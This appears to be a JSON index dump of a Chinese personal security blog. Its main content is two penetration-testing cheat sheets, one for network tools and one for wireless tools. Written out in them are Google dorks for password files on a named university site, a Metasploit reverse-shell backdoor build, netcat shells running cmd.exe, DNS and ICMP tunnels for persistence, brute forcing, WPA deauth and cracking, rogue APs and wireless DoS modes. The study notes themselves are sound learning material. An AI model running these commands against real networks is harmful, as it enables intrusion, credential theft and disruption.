cisco.listdnsmap cisco.com -w wordlist.txt -c cisco.csv 路由信息收集工具，一个传统的 udp 实现，一个现代一点的利用 tcp 实现，可以穿越防火墙。 paratrace, 一种新的、隐形的 traceroute, 可使用有状态的过滤器。 traceroute: 传统的工具 tcptraceroute：稍微新一点，利用 tcp 的工具。 搜索引擎的技巧 http://en.wikipedia.org/wiki/Google_hacking filetype:xls site:jlxy.nju.edu.cn 密码 site:jlxy.nju.edu.cn 密码 site:jlxy.nju.edu.cn filetype:doc site:jlxy.nju.edu.cn intext:admin 自动化，综合的信息收集平台 maltego 1：domain 2：dns 3：whois information 4：network block 5：ip address 6：E-mail 0x03 scanning发现主机 12345678910arping -c 2 192.168.1.1fping -s -r 1 192.168.1.1 192.168.1.254hping3 -c 2 192.168.1.1hping3hping&gt;hping send &#123;ip(addr=192.168.1.1)+icmp(type=8,code=0)&#125;nbtscan 192.168.1.1-254 操作系统指纹识别 主动：nmap -O 被动：p0f 端口扫描 autoscan netifera scanrand: 一个非常快速、无状态的 TCP 端口扫描器和 traceroute 工具 服务探测 12cd /pentest/enumeration/www/httprint/linux/httprint -h 192.168.1.1 -s singnature.txt VPN 探测 12ike-scan -M -v 192.168.1.1sslscan 192.168.1.1 0x04 Vulnerability discoveryCisco toolscisco auditing tool 1# ./CAT -h 192.182.1.1 -w lists/community -a lists/passwords -I Cisco passwd scanner 1# ./cisco 10.10.10 3 -t 4 -C 10 Snmp tools 12cd /pentest/enumeration/snmp/admsnmp./ADMsnmp 192.168.1.1 -wordf wordlist.list 如果你知道 snmp 的 community, 你可以使用这个工具收集信息。 12cd /pentest/enumeration/snmp/snmpenum/./snmpenum 192.168.1.1 private windows.txt 0x05 web toolkitBurp suite Nikto 1# ./nikto.pl -h 192.168.1.1 -C -p 80 T3487b -t 3 -D \\V -o webtest -F htm W3af 这个 waf 的探测工具：WAFW00F 12cd /pentest/web/waffit/./wafw00f http://.... 介绍两个成熟的框架：openvas，nessus 0x06 Integrated toolsMSF 1# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.150 LPORT=4444 X &gt; backdoor.exe 12345msfconsoleuse exploit/multi/handerset PAYLOAD windows/meterpreter/reverse_tcpset LPORT 192.168.1.150set LHOST 4444 0x07 local networkLayer 2: CDP(cisco discovery protocols) mac flood Layer 3:dhcp tcp syn flood 结合一点点嗅探技术：包由 Dug Song 编写，已经发布几年了，是一组强大的网络审核工具。其中有一个简洁的小工具 arpspoof, 可用于向 ARP 缓存注入虚假信息。该工具可以创建 Gratuitous ARP 应答，应答数据包中的源 IP 是用户打算伪装的 IP 地址，而目标 IP 则是所要嗅探的目标计算机。 0x08 crack the passwordonline：以破解 cisco 的路由器，和 html 表单的例子。12ncrack -U pass -v -P pass telnet://192.168.1.1ncrack -U pass -v -P pass http://192.168.1.1 offline：无线的密码破解是离线的0x09 Maintaining Access基本都是两台主机，其中一台替另一台通过某些服务对流量进行封装中继。 DNS 隧道Server:dns2tcpd 1./dns2tcpd -F -d 1 -f dns2tcpd.conf Client: 1./dns2tcpc -z domain.org 1234Domain=domain.orgRescoure = sshLocal_port = 2222Debug = 1 icmp 隧道Server: 1./ptunnel Client: 1./ptunnel -p tun.ser_ip -lp 2222 -da ture.ip -dp 22 代理服务器netcatWindows: 1nc.exe -d -L -p 1234 -e cmd.exe Remote: 1nc -l -p 1234 locale: 1nc -d remore port -e cmd.exe Nc realy:（利用脚本实现），就是一种重定向，指定的数据流转发，还可以把传输的信息 dump 一次。 123#!/bin/bashnc -o output.file ip_addr portnc -l -p 23 -e script.sh","tags":["security"]},{"title":"a curious mind","path":"/2014/08/19/a-curious-mind/","content":"吾生也有涯，而知也无涯。 有时候我很困惑，我问不同人相同的问题，不同的人为我解答，尽管他们说的不一样，但依然认为他们说的是对的，好像成语故事”盲人摸象”, 也许他们就是摸象的盲人，他们竭力为我这个准备去摸像的盲人描述他们摸到的东西，或蒲扇，或柱子，或墙壁。那么存在能完整描述大象的盲人么？我们这样的瞎子摸着蒲扇，柱子，墙壁的组合物会认为那是大象么？ 怕什么真理无穷，进一寸有一寸的欢喜。 也许我是个务实主义者，多数时间我会克制去想什么大象，柱子，盲人之间的事情。遇到问题我解决问题，对刨根问底的程度有着限制，因为知道那没有尽头，但有时候又能从突破克制中能获得一点快感，人真是有病。","tags":["life"]},{"title":"wireless tools","path":"/2014/07/12/wireless_tools/","content":"0x00 net-wireless&#x2F;aircrack-ng airbase-ng: 中间人攻击，伪造 ap 并且将无线的流量转发到有线网络 aircrack-ng: 主要用于 wep 以及 wpa-psk 的恢复，依赖于 dump 的数据包，此工具就可以自动测试是否可以破解 airdecap-ng: 用来解开加密状态的数据包 airdecloak-ng: 用于分析无线数据报文时过滤出指定无线网络数据 airdriver-ng: 用户查看工具包支持的芯片 airdrop-ng: 基于策略的无线 Deauth 的工具 aireplay-ng: 在进行 wep 和 wap-psk 的密码恢复时候，可以根据需要创建特殊的无线数据包报文 airgraph-ng airmon-ng: 网卡监控模式 airodump-ng: 抓取空中传播的数据包 airolib-ng: 进行 wpa 彩虹表攻击时使用，用于建立特定的数据库文件 airserv-ng: 可以将无线网卡连接到特定端口，为攻击时灵活调用准备 airtun-ng: besside-ng easside-ng: 用户 wep 的自动破解 packetforge-ng: 主要用于构造特殊的数据包，用于无客户端的破解 tkiptun-ng: 主要针对 wpa tkip 中启用 qos 的网络的注入 wesside-ng 文档链接 ^wiki 0x01 start interface monitor mode参数说明： 1root@kail:~/wireless# airmon-ng start waln0 0x02 capture the wireless frames参数说明：-w 后面是写入文件，–ivs 酌情使用，-c 后面是信道 1root@kali:~/wireless# airodump-ng -w hg -c 6 mon0 0x03 generate requestwep 的 Request 注入攻击加快有效的数据包生成，参数说明：-3 (–arpreplay) 就是攻击编号，-b 后面是 ap 的 MAC，-h 后面是 Client 的 MAC 1root@kali:~/wireless# aireplay-ng -3 -b 9C:21:6A:7E:2C:EC -h 64:5A:04:33:75:18 mon0 wap 的 Deauth 攻击获取 wpa 的握手报文：参数说明：-0 (–deauth) 就是攻击编号，后面是数据包数量，-a 后面是 ap 的 MAC，-c 后面是 Client 的 MAC 1root@kali:~/wireless# aireplay-ng -0 1 -a 9C:21:6A:7E:2C:EC -c 64:5A:04:33:75:18 mon0 0x04 crack the passwordweb 的破解，后面是.cap 或者 ivs 文件 1root@kali:~/wireless# aircrack-ng hg-01.cap 对于 wpa 的破解，-w 后面是字典文件 1root@kali:~/wireless# aircrack-ng -w /usr/share/dictionary/words hg-01.cap 0x05 aux tools.cap 提取.ivs 文件： 1root@kali:~/wireless# ivstools --convert hg-05.cap hg-05.ivs 把.ivs 文件合成一个： 1root@kali:~/wireless# ivstools --merge hg-01.ivs hg-02.ivs hg-05.ivs hg.ivs 解密无线数据帧，参数说明：-l 不移除 802.11 头部 1root@kali:~/wireless# airdecap-ng -l -e ESSID -p password hg-01.cap 热点伪造 1root@kali:~/wireless# airbase-ng -c 6 -A -Z 2 mon0 无线跳板的工具 12345678910111213# airserv-ng Airserv-ng 1.2 beta3 - (C) 2007, 2008, 2009 Andrea Bittauhttp://www.aircrack-ng.orgUsage: airserv-ng &lt;options&gt;Options: -h : This help screen -p &lt;port&gt; : TCP port to listen on (default:666) -d &lt;iface&gt; : Wifi interface to use -c &lt;chan&gt; : Channel to use -v &lt;level&gt; : Debug level (1 to 3; default: 1) 基于策略的无线 Deauth，下面策略的语法 1234567#deny rulesd/0a:00:27:00:00:03|dc:0e:a1:f4:3f:01Deny\tAP Client#------------------a/any|any# wireless airdrop-ng -i mon0 -t hg-01.csv -r rule 对抓取的数据包内容进行过滤（其实可以在 dump 时候用参数指定） 1# wireless airdecloak-ng --bssid 0a:00:27:00:00:03 --filters signal -i hg-01.cap wps 扫描工具 这里 下载，wpscan.py(扫描开启的无线路由器),wpspy.py(检测 wps 的状态).fix: 如果运行出现：Caught exception sniffing packets: global name ‘sniff’ is not defined 解决方案，修改一下 python 构造包的倒入，我下面的方法是简化的，但是意思一样 12345#!/usr/bin/env pythonfrom sys import argv, stderr, exitfrom getopt import GetoptError, getopt as GetOptfrom scapy.all import * 无线 dos 工具:mdk 1234567891011121314151617181920212223242526b\t- Beacon Flood Mode Sends beacon frames to show fake APs at clients. This can sometimes crash network scanners and even drivers!a\t- Authentication DoS mode Sends authentication frames to all APs found in range. Too much clients freeze or reset some APs.p\t- Basic probing and ESSID Bruteforce mode Probes AP and check for answer, useful for checking if SSID has been correctly decloaked or if AP is in your adaptors sending range SSID Bruteforcing is also possible with this test mode.d\t- Deauthentication / Disassociation Amok Mode Kicks everybody found from APm\t- Michael shutdown exploitation (TKIP) Cancels all traffic continuouslyx\t- 802.1X testsw\t- WIDS/WIPS Confusion Confuse/Abuse Intrusion Detection and Prevention Systemsf\t- MAC filter bruteforce mode This test uses a list of known client MAC Adresses and tries to authenticate them to the given AP while dynamically changing its response timeout for best performance. It currently works only on APs who deny an open authentication request properlyg\t- WPA Downgrade test deauthenticates Stations and APs sending WPA encrypted packets. With this test you can check if the sysadmin will try setting his network to WEP or disable encryption. 无线欺骗 net-wireless&#x2F;airpwn, 通过无线数据包匹配的地方修改替换掉，并且伪装为 AP 发送数据 12345# cat /usr/share/airpwn/conf/js_html begin js_htmlmatch ^(GET|POST)ignore ^GET [^ ?]+\\.(jpg|jpeg|gif|png|tif|tiff)response /usr/share/airpwn/content/js_html 语法类似 1# airpwn -c /usr/share/airpwn/conf/greet_html -i mon0 -d mac80211 -vvv -F 针对 open 的，-k 参数后面可以加 wep 的密码，wap 没有看到参数。","tags":["security"]},{"path":"/wiki/ws-proxy/index.html","content":"hi all. the Goooop is a simple go reverse proxy"},{"title":"links","path":"/friends/index.html","content":"philo jy 巨巨的博客,主要关注 linux 与运维自动化. 摩云飞 sf 巨巨,关注分布式计算,消息队列技术. shu-mj mj 巨巨算法大神"},{"title":"About","path":"/about/index.html","content":"我是谁？ Linux 与 软件安全 爱好者。 RHCA 认证持有者。 就职于网易游戏基础架构部门。 为什么会有这个博客？ 一来记忆有时不准,以博客来记录学习以便查阅,如有错误还望指正。 二来结识同道中人,独学而无友，好比闭门造车,希望和大家一起进步。"},{"path":"/wiki/linux-exp-dev/index.html","content":"a linux exploit develop guide for newbiw"}]